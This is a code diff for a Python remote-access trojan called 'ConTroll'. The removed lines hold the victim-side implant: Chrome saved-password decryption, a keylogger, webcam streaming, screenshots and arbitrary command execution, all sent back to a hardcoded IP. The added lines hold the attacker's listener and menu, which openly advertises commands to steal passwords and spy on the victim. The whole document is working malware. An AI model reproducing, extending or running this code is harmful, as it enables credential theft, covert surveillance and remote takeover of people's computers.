@@ -1,217 +1,193 @@
-from __future__ import print_function
-from shutil import copyfile
-from PIL import ImageGrab
-from os import getenv  
-import sqlite3, win32crypt, socket, subprocess, os, tempfile 
-import shutil, threading, win32api, pythoncom, random         
-import numpy, sys, pyHook, shutil, cv2, time, ctypes
+import socket, os, time, argparse
+import cv2, socket, numpy
+ 
+ip_address = '192.168.10.15'
 
-ImagePath = tempfile.mkdtemp()
-keyLog = tempfile.mkdtemp()
-f_name = keyLog+"\log.txt"
-ip_address = '192.168.10.12'
+banner ="""                                                  
+   (                    *   )               (    (   
+   )\                 ` )  /(   (           )\   )\  
+ (((_)    (     (      ( )(_))  )(     (   ((_) ((_) 
+ )\___    )\    )\ )  (_(_())  (()\    )\   _    _   
+((/ __|  ((_)  _(_/(  |_   _|   ((_)  ((_) | |  | |  
+ | (__  / _ \ | ' \))   | |    | '_| / _ \ | |  | |  
+  \___| \___/ |_||_|    |_|    |_|   \___/ |_|  |_|
 
-def lockScreen():
-    ctypes.windll.user32.LockWorkStation()
+(C) Start Conning and Trolling TODAY!!
 
+FiRsT TiMe? TyPe \'CoN-mE\' fOr HeLp
+"""
 
-def get_chrome_path(s):
-    try:
-        path = getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\Login Data"
-        path2 = getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\Login2"
-        copyfile(path, path2)
-
-        conn = sqlite3.connect(path2)
-        cursor = conn.cursor() 
-        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+def functions():
+    print '\nNB: When connected to victim, you can run any windows commands remotely\neg. shutdown'
+    print '\n----------------------------------------------------------'
+    print '\t\tConTroll Options'
+    print '----------------------------------------------------------'
+    print 'start-trolling  --> Wait for a victim to be hooked'
+    print 'stop-trolling   --> Disconnect from victim'
+    print '----------------------------------------------------------'
+    print '\nUse these added Commands to Con/Troll the Victim\n'
+    print 'about           --> Get information about victim\'s machine'
+    print 'activateWebcam  --> Active Victim\'s webcam'
+    print 'chromeDump      --> Steal saved passwords stored in chrome'
+    print 'getLogFile      --> Get Keylogger file with logged keys'
+    print 'grab <arg>      --> Grab a file from the victim\'s machine'
+    print 'kill            --> Kill any process running on victim\'s machine'
+    print 'lockScreen      --> Lock Victim\'s screen'
+    print 'screencap       --> Get a screen shot of the victim\'s desktop'
+    print 'startLogger     --> Start keylogger'
+    print 'stopLogger      --> Stop keylogger'
+    print 'terminate       --> Stop Trolling'
+    print '\ntroll--<Troll message>--<buttonCode+iconCode>--<Popup title>--<# of popus> --> Troll victim with pop ups\n'
+    print """button Codes                  -                 Icon Codes
+0: Normal message box                   16: Critical message icon
+1: OK and Cancel                        32: Warning query icon
+2: Abort, Retry, Ignore                 48: Warning message icon 
+3: Yes, No, Cancel                      64: Information message icon
+4: Yes and No	                        4096: Always on top of the desktop
+5: Retry and Cancel
+    """
+                                                 
+def webCam(connection, command):
+    connection.send(command)
+    while True:
+        soc = socket.socket()
+        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        soc.bind((ip_address, 9900)) #bind on all interface to port 9900
+        soc.listen(1) #listen for one connection
+        conn, addr = soc.accept() #accept connection
         
-        chromeDump = tempfile.mkdtemp()
-        with open(chromeDump+'\ChromeDump.txt', 'w+') as f:
-            for raw in cursor.fetchall():
-                print('URL: '+raw[0] + '\n' + 'Username: '+raw[1] , file=f)
-                password = win32crypt.CryptUnprotectData(raw[2])[1] 
-                print('Password: '+password, file=f)
-                print('\n', file=f)
-            
-        conn.close()
-        os.remove(path2)
-        return chromeDump, True
-    except:
-        return "Chrome Doesn't exists", False
+        message = [] #variable to hold the data
+        while True:
+            d = conn.recv(1024 * 1024) #receive this much data
+            if not d: break
+            message.append(d)
+        data = ''.join(message) #assemble the entire data
+        numpy_data = numpy.fromstring(data, numpy.uint8) #convert to its original format
+         
+        decimg = cv2.imdecode(numpy_data, 1) #read image from memory buffer(numpy_data)
+        cv2.imshow("Remote WebCam", decimg) #display image
+         
+        if cv2.waitKey(5) == 27: break #close if user presses 'ESC'
+         
+    cv2.destroyAllWindows()
 
-def recWebCam():
-    try:
-        cap = cv2.VideoCapture(1) #Capture from webcam       
-        while True:
-            ret, frame = cap.read() #get image from frame
-            _, imgencode = cv2.imencode(".jpg", frame) #encode image into memory buffer
-            data = numpy.array(imgencode) #create numpy array from image encoding
-            stringData = data.tostring() #convert numpy array to string
-            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            soc.connect((ip_address, 9900))
-            soc.sendall(stringData)
-            soc.close()
-    except:
-        cap = cv2.VideoCapture(0) #Capture from webcam
-        while True:
-            ret, frame = cap.read() #get image from frame
-            _, imgencode = cv2.imencode(".jpg", frame) #encode image into memory buffer
-            data = numpy.array(imgencode) #create numpy array from image encoding
-            stringData = data.tostring() #convert numpy array to string
-            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            soc.connect((ip_address, 9900))
-            soc.sendall(stringData)
-            soc.close()
+def transfer(conn,command):
+    conn.send(command)
+    f = open('test.png','wb')
+    while True:  
+        bits = conn.recv(1024)
+        if 'Unable to find out the file' in bits:
+            print '[-] Unable to find out the file'
+            break
+        if bits.endswith('DONE'):
+            print '[+] Transfer completed '
+            f.close()
+            break
+        elif bits.endswith('captured'):
+            print '[+] Transferring Screen Shot of Victim...'
+            time.sleep(2)
+            print '\n[+] Transfer completed '
+            f.close()
+            break
+        elif bits.endswith('LogSent'):
+            print '[+] Transferring KeyLog File...'
+            time.sleep(2)
+            print '\n[+] Transfer completed '
+            f.close()
+            break
+        elif bits.endswith('DumpSent'):
+            print '[+] Transferring Chrome Login Data File...'
+            time.sleep(2)
+            print '\n[+] Transfer completed '
+            f.close()
+            break
+        f.write(bits)
         
-def keypressed(event):
-    global data
-    if event.Ascii == 13:
-            keys = '\n'
-            fp = open(f_name,'a')
-            data = keys            
-            fp.write(data)
-            fp.close()
-    elif event.Ascii == 8:
-            keys = ' <BS> '
-            fp = open(f_name,'a')
-            data = keys            
-            fp.write(data)
-            fp.close()
-    elif event.Ascii == 9:
-            keys = ' \t '
-            fp = open(f_name,'a')
-            data = keys
-            fp.write(data)
-            fp.close()
-    elif event.Ascii == 27:
-            keys = ' <ESC> '
-            fp = open(f_name,'a')
-            data = keys
-            fp.write(data + "\n")
-            fp.close()
-    elif event.Ascii == 1 or event.Ascii == 3 or event.Ascii == 19 or event.Ascii == 0 or event.Ascii == 24:
-            pass
-    else:
-            keys = chr(event.Ascii)
-            fp = open(f_name,'a')
-            data = keys
-            fp.write(data)
-            fp.close()
+def transferChromeDump(conn,command):
+    conn.send(command)
+    f = open('ChromeLoginData.txt','wb')
+    while True:  
+        bits = conn.recv(1024)
+        if 'Chrome Doesn\'t exists' in bits:
+            print '[-] Chrome Doesn\'t exists'
+            break
+        elif bits.endswith('DumpSent'):
+            print '[+] Transferring Chrome Login Data File...'
+            time.sleep(2)
+            print '\n[+] Transfer completed '
+            f.close()
+            break
+        f.write(bits)
 
-def environment():
-    resp = ''
-    for n in os.environ:
-        resp += "{0:35}: {1}\n".format(n,os.environ.get(n))
-    resp = resp.replace(';','\n{0:39}: '.format(""))
-    return resp
-
-def startLogger():
-    global obj
-    obj = pyHook.HookManager()
-    obj.KeyDown = keypressed
-    obj.HookKeyboard()
-    pythoncom.PumpMessages()
-    
-def stopLogger():
-        obj.UnhookKeyboard()
-    
-def transfer(s,path,command):
-    if os.path.exists(path):
-        f = open(path, 'rb')
-        packet = f.read(1024*1024)#1MB
-        while packet != '':
-            s.send(packet) 
-            packet = f.read(1024*1024)
-        if 'grab' in command:
-            s.send('DONE')
-        elif 'screencap' in command:
-            s.send('captured')
-        elif 'getLogFile' in command:
-            s.send('LogSent')
-        elif 'chromeDump' in command:
-            s.send('DumpSent')
-        f.close()
-    else: # the file doesn't exist
-        s.send('Unable to find out the file')
-
-def getKeyLogFile(s, path):
-    transfer(s,path)
+def snapshot(conn,command):
+    conn.send(command)
+    f = open('snapshot.png','wb')
+    while True:  
+        bits = conn.recv(1024)
+        if bits.endswith('snapSent'):
+            print '\n[+] Snap Taken '
+            f.close()
+            break
+        f.write(bits)
 
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip_address, 8080))
- 
-    while True: 
-        command =  s.recv(1024*1024)
-        
-        if 'kill' in command:
-            command = command.split(' ')
-            command = 'Taskkill /IM '+command[1]+' /F'
-            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        elif 'terminate' in command:
-           return 1
-        elif 'grab' in command:            
-            grab,path = command.split(' ')
-            try:
-                transfer(s,path,command)
-            except Exception,e:
-                s.send ( str(e) )  
-                pass
-        elif 'screencap' in command:
-            try:
-                dirpath = tempfile.mkdtemp()
-                ImageGrab.grab().save(dirpath+"\img.jpg", "JPEG")
-                transfer(s, dirpath+"\img.jpg", command)
-                shutil.rmtree(dirpath)
-            except Exception, e:
-                s.send(str(e))
-                pass
-        elif 'startLogger' in command:
-            logging = threading.Thread(target=startLogger)
-            logging.start()
-            s.send('[+] Keylogger started')
-        elif 'activateWebcam' in command:
-            webcam = threading.Thread(target=recWebCam)
-            webcam.start()
-        elif 'stopLogger' in command:
-            stopLogger()
-            s.send('[+] Keylogger stopped')
-        elif 'about' in command:
-            response = environment()
-            s.send(response)
-        elif 'getLogFile' in command:
-            transfer(s, f_name, command)
-            shutil.rmtree(keyLog)
-        elif 'askPass' in command:
-            askPass(s)
-        elif 'chromeDump' in command:
-            path, success = get_chrome_path(s)
-            if success:
-                transfer(s, path+"\ChromeDump.txt", command)
-                shutil.rmtree(path)
-            else:
-                s.send("[!] Chrome Doesn't exists")
-        elif 'lockScreen' in command:
-            lockScreen()
-            s.send( "[+] Victim Screen Lock")
-        elif 'cd' in command:
-            code,directory = command.split (' ')
-            os.chdir(directory)
-            s.send( "[+] CWD Is " + os.getcwd() )
-        else:
-            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            s.send( CMD.stdout.read()  ) 
-            s.send( CMD.stderr.read()  ) 
+    s.bind((ip_address, 8080))
+    s.listen(1)
+    print '[+] Listening for incoming TCP connection on port 8080'
+    conn, addr = s.accept()
+    print '[+] We got a connection from: ', addr
 
-def main ():
     while True:
-        try:
+        command = raw_input("Shell> ")
+        if 'stop-trolling' in command:
+            conn.send('terminate')
+            conn.close()
+            return 1
+        elif 'grab' in command: 
+            transfer(conn,command)
+        elif 'screencap' in command:
+            transfer(conn, command)
+        elif 'getLogFile' in command:
+             transfer(conn, command)
+        elif 'CoN-mE' in command:
+             functions()
+        elif 'getWebcam' in command:
+             transfer(conn, command)
+        elif 'activateWebcam' in command:
+            webCam(conn, command)
+        elif 'chromeDump' in command:
+            transferChromeDump(conn, command)
+        elif 'send' in command:
+            image = command.split(' ')
+            transferImage(conn, image[1], command)
+        elif 'snapshot' in command:
+            snapshot(conn, command)
+        elif 'troll' in command:
+            try:
+                call, msg, icons, title, times = command.split('--')
+                conn.send(command) 
+            except:
+                print 'Usage troll--<Troll message>--<buttonCode+iconCode>--<Popup title>--<# of popus>\neg. troll--"You\'ve been p0wned"--0+16+4096--"trolled"--120\ntype \'CoN-mE\' for more information'
+        else:
+            conn.send(command) 
+            print conn.recv(1024) 
+        
+def main ():
+    os.system('cls')
+    print banner
+    while True:
+        cmd = raw_input('> ')
+        if cmd == 'CoN-mE':
+            functions()
+        elif cmd == 'start-trolling':
             if connect() == 1:
+                os.system('cls')
+                print banner
+                print 'Hope You Had Fun!'
                 break
-        except:
-            sleep_for = random.randrange(1, 10)
-            time.sleep(sleep_for)   
-            pass
+        else:
+            main()
 
-if __name__ == "__main__":
-    main()
+    
+main()
